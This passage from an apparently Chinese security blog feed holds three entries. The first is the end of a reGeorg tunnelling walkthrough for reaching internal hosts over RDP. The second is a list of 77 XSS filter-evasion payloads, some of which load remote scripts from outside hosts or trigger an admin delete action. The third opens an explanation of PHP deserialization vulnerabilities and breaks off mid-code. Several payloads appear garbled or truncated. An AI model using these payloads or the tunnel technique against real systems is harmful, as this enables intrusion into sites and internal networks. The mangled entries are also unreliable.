<p>先将reGeorg的对应脚本上传到服务器端，直接访问显示“Georg says, ‘All seems fine’”，表示脚本运行正常</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reGeorg1.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -p 8888 -u http://192.168.1.117/tunnel.php</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reGeorg2.png" alt=""></p>
<p>将proxifier打开，在Proxy Server中这样配置<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reGeorg22.png" alt=""></p>
<p>右击“mstsc.exe”，选择“proxifier”-》proxy socks5 127.0.0.1进行远程连接<br><img src="http://xianzhi.aliyun.com/forum/attachment/Mon_1703/4_1369089561206498_634c5121ba88660.jpg" alt=""></p>
<p>输入内网ip，192.168.1.117</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reGeorg4.png" alt=""></p>
<p>可以看到reGeorg的状态，和proxifier的状态<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reGeorg3.png" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reGeorg5.png" alt=""></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[xss payload 大全]]></title>
      <url>https://uknowsec.cn/posts/notes/xss-payload-%E5%A4%A7%E5%85%A8.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><span class="line">(1)普通的XSS JavaScript注入</span><br><span class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(2)IMG标签XSS使用JavaScript命令</span><br><span class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(3)IMG标签无分号无引号</span><br><span class="line">&lt;IMG SRC=javascript:alert(‘XSS’)&gt;</span><br><span class="line"></span><br><span class="line">(4)IMG标签大小写不敏感</span><br><span class="line">&lt;IMG SRC=JaVaScRiPt:alert(‘XSS’)&gt;</span><br><span class="line"></span><br><span class="line">(5)HTML编码(必须有分号)</span><br><span class="line">&lt;IMG SRC=javascript:alert(“XSS”)&gt;</span><br><span class="line"></span><br><span class="line">(6)修正缺陷IMG标签</span><br><span class="line">&lt;IMG “”&quot;&gt;&lt;SCRIPT&gt;alert(“XSS”)&lt;/SCRIPT&gt;”&gt;</span><br><span class="line"></span><br><span class="line">(7)formCharCode标签(计算器)</span><br><span class="line">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</span><br><span class="line"></span><br><span class="line">(8)UTF-8的Unicode编码(计算器)</span><br><span class="line">&lt;IMG SRC=jav..省略..S&apos;)&gt;</span><br><span class="line"></span><br><span class="line">(9)7位的UTF-8的Unicode编码是没有分号的(计算器)</span><br><span class="line">&lt;IMG SRC=jav..省略..S&apos;)&gt;</span><br><span class="line"></span><br><span class="line">(10)十六进制编码也是没有分号(计算器)</span><br><span class="line">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br><span class="line"></span><br><span class="line">(11)嵌入式标签,将Javascript分开</span><br><span class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(12)嵌入式编码标签,将Javascript分开</span><br><span class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(13)嵌入式换行符</span><br><span class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(14)嵌入式回车</span><br><span class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(15)嵌入式多行注入JavaScript,这是XSS极端的例子</span><br><span class="line">&lt;IMG SRC=”javascript:alert(‘XSS‘)”&gt;</span><br><span class="line"></span><br><span class="line">(16)解决限制字符(要求同页面)</span><br><span class="line">&lt;script&gt;z=’document.’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’write(“‘&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’&lt;script’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’ src=ht’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’tp://ww’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’w.shell’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’.net/1.’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’js&gt;&lt;/sc’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+’ript&gt;”)’&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval_r(z)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">(17)空字符</span><br><span class="line">perl -e ‘print “&lt;IMG SRC=java\0script:alert(\”XSS\”)&gt;”;’ &gt; out</span><br><span class="line"></span><br><span class="line">(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用</span><br><span class="line">perl -e ‘print “&lt;SCR\0IPT&gt;alert(\”XSS\”)&lt;/SCR\0IPT&gt;”;’ &gt; out</span><br><span class="line"></span><br><span class="line">(19)Spaces和meta前的IMG标签</span><br><span class="line">&lt;IMG SRC=”   javascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(20)Non-alpha-non-digit XSS</span><br><span class="line">&lt;SCRIPT/XSS SRC=”http://3w.org/XSS/xss.js”&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(21)Non-alpha-non-digit XSS to 2</span><br><span class="line">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(“XSS”)&gt;</span><br><span class="line"></span><br><span class="line">(22)Non-alpha-non-digit XSS to 3</span><br><span class="line">&lt;SCRIPT/SRC=”http://3w.org/XSS/xss.js”&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(23)双开括号</span><br><span class="line">&lt;&lt;SCRIPT&gt;alert(“XSS”);//&lt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(24)无结束脚本标记(仅火狐等浏览器)</span><br><span class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js?&lt;B&gt;</span><br><span class="line"></span><br><span class="line">(25)无结束脚本标记2</span><br><span class="line">&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;</span><br><span class="line"></span><br><span class="line">(26)半开的HTML/JavaScript XSS</span><br><span class="line">&lt;IMG SRC=”javascript:alert(‘XSS’)”</span><br><span class="line"></span><br><span class="line">(27)双开角括号</span><br><span class="line">&lt;iframe src=http://3w.org/XSS.html &lt;</span><br><span class="line"></span><br><span class="line">(28)无单引号 双引号 分号</span><br><span class="line">&lt;SCRIPT&gt;a=/XSS/</span><br><span class="line">alert(a.source)&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(29)换码过滤的JavaScript</span><br><span class="line">\”;alert(‘XSS’);//</span><br><span class="line"></span><br><span class="line">(30)结束Title标签</span><br><span class="line">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(“XSS”);&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(31)Input Image</span><br><span class="line">&lt;INPUT SRC=”javascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(32)BODY Image</span><br><span class="line">&lt;BODY BACKGROUND=”javascript:alert(‘XSS’)”&gt;</span><br><span class="line"></span><br><span class="line">(33)BODY标签</span><br><span class="line">&lt;BODY(‘XSS’)&gt;</span><br><span class="line"></span><br><span class="line">(34)IMG Dynsrc</span><br><span class="line">&lt;IMG DYNSRC=”javascript:alert(‘XSS’)”&gt;</span><br><span class="line"></span><br><span class="line">(35)IMG Lowsrc</span><br><span class="line">&lt;IMG LOWSRC=”javascript:alert(‘XSS’)”&gt;</span><br><span class="line"></span><br><span class="line">(36)BGSOUND</span><br><span class="line">&lt;BGSOUND SRC=”javascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(37)STYLE sheet</span><br><span class="line">&lt;LINK REL=”stylesheet” HREF=”javascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(38)远程样式表</span><br><span class="line">&lt;LINK REL=”stylesheet” HREF=”http://3w.org/xss.css”&gt;</span><br><span class="line"></span><br><span class="line">(39)List-style-image(列表式)</span><br><span class="line">&lt;STYLE&gt;li &#123;list-style-image: url(“javascript:alert(‘XSS’)”);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</span><br><span class="line"></span><br><span class="line">(40)IMG VBscript</span><br><span class="line">&lt;IMG SRC=’vbscript:msgbox(“XSS”)’&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</span><br><span class="line"></span><br><span class="line">(41)META链接url</span><br><span class="line">&lt;META HTTP-EQUIV=”refresh” CONTENT=”0; URL=http://;URL=javascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(42)Iframe</span><br><span class="line">&lt;IFRAME SRC=”javascript:alert(‘XSS’);”&gt;&lt;/IFRAME&gt;</span><br><span class="line"></span><br><span class="line">(43)Frame</span><br><span class="line">&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert(‘XSS’);”&gt;&lt;/FRAMESET&gt;</span><br><span class="line"></span><br><span class="line">(44)Table</span><br><span class="line">&lt;TABLE BACKGROUND=”javascript:alert(‘XSS’)”&gt;</span><br><span class="line"></span><br><span class="line">(45)TD</span><br><span class="line">&lt;TABLE&gt;&lt;TD BACKGROUND=”javascript:alert(‘XSS’)”&gt;</span><br><span class="line"></span><br><span class="line">(46)DIV background-image</span><br><span class="line">&lt;DIV STYLE=”background-image: none)”&gt;</span><br><span class="line"></span><br><span class="line">(47)DIV background-image后加上额外字符(1-32&amp;34&amp;39&amp;160&amp;8192-8&amp;13&amp;12288&amp;65279)</span><br><span class="line">&lt;DIV STYLE=”background-image: none)”&gt;</span><br><span class="line"></span><br><span class="line">(48)DIV expression</span><br><span class="line">&lt;DIV STYLE=”width: expression_r(alert(‘XSS’));”&gt;</span><br><span class="line"></span><br><span class="line">(49)STYLE属性分拆表达</span><br><span class="line">&lt;IMG STYLE=”xss:expression_r(alert(‘XSS’))”&gt;</span><br><span class="line"></span><br><span class="line">(50)匿名STYLE(组成:开角号和一个字母开头)</span><br><span class="line">&lt;XSS STYLE=”xss:expression_r(alert(‘XSS’))”&gt;</span><br><span class="line"></span><br><span class="line">(51)STYLE background-image</span><br><span class="line">&lt;STYLE&gt;.XSS&#123;background-image:none”);&#125;&lt;/STYLE&gt;&lt;A class=&quot;XSS&quot;&gt;&lt;/A&gt;</span><br><span class="line"></span><br><span class="line">(52)IMG STYLE方式</span><br><span class="line">exppression(alert(“XSS”))’&gt;</span><br><span class="line"></span><br><span class="line">(53)STYLE background</span><br><span class="line">&lt;STYLE&gt;&lt;STYLE type=”text/css”&gt;BODY&#123;background:url(“javascript:alert(‘XSS’)”)&#125;&lt;/STYLE&gt;</span><br><span class="line"></span><br><span class="line">(54)BASE</span><br><span class="line">&lt;BASE HREF=”javascript:alert(‘XSS’);//”&gt;</span><br><span class="line"></span><br><span class="line">(55)EMBED标签,你可以嵌入FLASH,其中包涵XSS</span><br><span class="line">&lt;EMBED SRC=”http://3w.org/XSS/xss.swf” &gt;&lt;/EMBED&gt;</span><br><span class="line"></span><br><span class="line">(56)在flash中使用ActionScrpt可以混进你XSS的代码</span><br><span class="line">a=”get”;</span><br><span class="line">b=”URL(\”&quot;;</span><br><span class="line">c=”javascript:”;</span><br><span class="line">d=”alert(‘XSS’);\”)”;</span><br><span class="line">eval_r(a+b+c+d);</span><br><span class="line"></span><br><span class="line">(57)XML namespace.HTC文件必须和你的XSS载体在一台服务器上</span><br><span class="line">&lt;HTML xmlns:xss&gt;</span><br><span class="line">&lt;?import namespace=”xss” implementation=”http://3w.org/XSS/xss.htc”&gt;</span><br><span class="line">&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br><span class="line"></span><br><span class="line">(58)如果过滤了你的JS你可以在图片里添加JS代码来利用</span><br><span class="line">&lt;SCRIPT SRC=””&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(59)IMG嵌入式命令,可执行任意命令</span><br><span class="line">&lt;IMG SRC=”http://www.XXX.com/a.php?a=b”&gt;</span><br><span class="line"></span><br><span class="line">(60)IMG嵌入式命令(a.jpg在同服务器)</span><br><span class="line">Redirect 302 /a.jpg http://www.XXX.com/admin.asp&amp;deleteuser</span><br><span class="line"></span><br><span class="line">(61)绕符号过滤</span><br><span class="line">&lt;SCRIPT a=”&gt;” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(62)</span><br><span class="line">&lt;SCRIPT =”&gt;” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(63)</span><br><span class="line">&lt;SCRIPT a=”&gt;” ” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(64)</span><br><span class="line">&lt;SCRIPT “a=’&gt;’” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(65)</span><br><span class="line">&lt;SCRIPT a=`&gt;` SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(66)</span><br><span class="line">&lt;SCRIPT a=”&gt;’&gt;” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(67)</span><br><span class="line">&lt;SCRIPT&gt;document.write(“&lt;SCRI”);&lt;/SCRIPT&gt;PT SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(68)URL绕行</span><br><span class="line">&lt;A HREF=”http://127.0.0.1/”&gt;XSS&lt;/A&gt;</span><br><span class="line"></span><br><span class="line">(69)URL编码</span><br><span class="line">&lt;A HREF=”http://3w.org”&gt;XSS&lt;/A&gt;</span><br><span class="line"></span><br><span class="line">(70)IP十进制</span><br><span class="line">&lt;A HREF=”http://3232235521″&gt;XSS&lt;/A&gt;</span><br><span class="line"></span><br><span class="line">(71)IP十六进制</span><br><span class="line">&lt;A HREF=”http://0xc0.0xa8.0×00.0×01″&gt;XSS&lt;/A&gt;</span><br><span class="line"></span><br><span class="line">(72)IP八进制</span><br><span class="line">&lt;A HREF=”http://0300.0250.0000.0001″&gt;XSS&lt;/A&gt;</span><br><span class="line"></span><br><span class="line">(73)混合编码</span><br><span class="line">&lt;A HREF=”h</span><br><span class="line">tt p://6 6.000146.0×7.147/”&quot;&gt;XSS&lt;/A&gt;</span><br><span class="line"></span><br><span class="line">(74)节省[http:]</span><br><span class="line">&lt;A HREF=”//www.google.com/”&gt;XSS&lt;/A&gt;</span><br><span class="line"></span><br><span class="line">(75)节省[www]</span><br><span class="line">&lt;A HREF=”http://google.com/”&gt;XSS&lt;/A&gt;</span><br><span class="line"></span><br><span class="line">(76)绝对点绝对DNS</span><br><span class="line">&lt;A HREF=”http://www.google.com./”&gt;XSS&lt;/A&gt;</span><br><span class="line"></span><br><span class="line">(77)javascript链接</span><br><span class="line">&lt;A HREF=”javascript:document.location=’http://www.google.com/’”&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[理解php序列化漏洞]]></title>
      <url>https://uknowsec.cn/posts/notes/%E7%90%86%E8%A7%A3php%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<p>PHP对象注入是一个非常常见的漏洞，这个类型的漏洞虽然有些难以利用，但仍旧非常危险。为了理解这个漏洞，请读者具备基础的php知识。类和变量是非常容易理解的php概念。举个例子，1.php在一个类中定义了一个变量和一个方法。它创建了一个对象并且调用了PrintVariable函数，该函数会输出变量variable。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">   </span><br><span class="line">class TestClass  </span><br><span class="line">&#123;  </span><br><span class="line">    // 一个变量  </span><br><span class="line">   </span><br><span class="line">    public $variable = &apos;This is a string&apos;;  </span><br><span class="line">   </span><br><span class="line">    // 一个简单的方法  </span><br><span class="line">   </span><br><span class="line">    public function PrintVariable()  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo $this-&gt;variable;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">// 创建一个对象  </span><br><span class="line">   </span><br><span class="line">$object = new TestClass();  </span><br><span class="line">   </span><br><span class="line">// 调用一个方法  </span><br><span class="line">   </span><br><span class="line">$object-&gt;PrintVariable();  </span><br><span class="line">   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161225214524536" alt=""></p>
<p>php类可能会包含一些特殊的函数叫magic函数，magic函数命名是以符号<strong>开头的，比如 </strong>construct, <strong>destruct, </strong>toString, <strong>sleep, </strong>wakeup等等。这些函数在某些情况下会自动调用，比如<strong>construct当一个对象创建时被调用，</strong>destruct当一个对象销毁时被调用，<strong>toString当一个对象被当作一个字符串使用。为了更好的理解magic方法是如何工作的，在2.php中增加了三个magic方法，</strong>construct, <strong>destruct和</strong>toString。可以看出，<strong>construct在对象创建时调用，</strong>destruct在php脚本结束时调用，__toString在对象被当作一个字符串使用时调用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">   </span><br><span class="line">class TestClass  </span><br><span class="line">&#123;  </span><br><span class="line">    // 一个变量  </span><br><span class="line">   </span><br><span class="line">    public $variable = &apos;This is a string&apos;;  </span><br><span class="line">   </span><br><span class="line">    // 一个简单的方法  </span><br><span class="line">   </span><br><span class="line">    public function PrintVariable()  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo $this-&gt;variable . &apos;&lt;br /&gt;&apos;;  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    // Constructor  </span><br><span class="line">   </span><br><span class="line">    public function __construct()  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo &apos;__construct &lt;br /&gt;&apos;;  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    // Destructor  </span><br><span class="line">   </span><br><span class="line">    public function __destruct()  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo &apos;__destruct &lt;br /&gt;&apos;;  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    // Call  </span><br><span class="line">   </span><br><span class="line">    public function __toString()  </span><br><span class="line">    &#123;  </span><br><span class="line">        return &apos;__toString&lt;br /&gt;&apos;;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">// 创建一个对象  </span><br><span class="line">//  __construct会被调用  </span><br><span class="line">   </span><br><span class="line">$object = new TestClass();  </span><br><span class="line">   </span><br><span class="line">// 创建一个方法   </span><br><span class="line">   </span><br><span class="line">$object-&gt;PrintVariable();  </span><br><span class="line">   </span><br><span class="line">// 对象被当作一个字符串  </span><br><span class="line">//  __toString会被调用  </span><br><span class="line">   </span><br><span class="line">echo $object;  </span><br><span class="line">   </span><br><span class="line">// End of PHP script  </span><br><span class="line">// 脚本结束__destruct会被调用  </span><br><span class="line">   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161226145426730" alt=""></p>
<p>php允许保存一个对象方便以后重用，这个过程被称为序列化。为什么要有序列化这种机制呢?在传递变量的过程中，有可能遇到变量值要跨脚本文件传递的过程。试想，如果为一个脚本中想要调用之前一个脚本的变量，但是前一个脚本已经执行完毕，所有的变量和内容释放掉了，我们要如何操作呢?难道要前一个脚本不断的循环，等待后面脚本调用?这肯定是不现实的。serialize和unserialize就是用来解决这一问题的。serialize可以将变量转换为字符串并且在转换中可以保存当前变量的值；unserialize则可以将serialize生成的字符串变换回变量。让我们在3.php中添加序列化的例子，看看php对象序列化之后的格式。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line">     </span><br><span class="line">// 某类    </span><br><span class="line">     </span><br><span class="line">class User    </span><br><span class="line">&#123;    </span><br><span class="line">    // 类数据    </span><br><span class="line">     </span><br><span class="line">    public $age = 0;    </span><br><span class="line">    public $name = &apos;&apos;;    </span><br><span class="line">     </span><br><span class="line">    // 输出数据    </span><br><span class="line">     </span><br><span class="line">    public function PrintData()    </span><br><span class="line">    &#123;    </span><br><span class="line">        echo &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age    </span><br><span class="line">             . &apos; years old. &lt;br /&gt;&apos;;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;    </span><br><span class="line">     </span><br><span class="line">// 创建一个对象    </span><br><span class="line">     </span><br><span class="line">$usr = new User();    </span><br><span class="line">     </span><br><span class="line">// 设置数据    </span><br><span class="line">     </span><br><span 